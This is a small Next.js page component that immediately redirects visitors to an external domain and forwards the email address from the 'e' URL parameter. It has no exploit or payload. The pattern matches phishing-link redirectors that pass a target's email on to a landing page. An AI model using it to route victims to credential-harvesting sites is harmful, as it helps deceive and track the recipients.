'use client';
import { Suspense, useEffect } from 'react';
import { useSearchParams } from 'next/navigation';

function Redirect() {
  const searchParams = useSearchParams();

  useEffect(() => {
    const email = searchParams.get('e');
    const target = email
      ? `https://fewdomain.com?e=${encodeURIComponent(email)}`
      : 'https://fewdomain.com';
    window.location.href = target;
  }, [searchParams]);

  return <p>Redirecting...</p>;
}

export default function Home() {
  return (
    <Suspense fallback={<p>Loading...</p>}>
      <Redirect />
    </Suspense>
  );
}
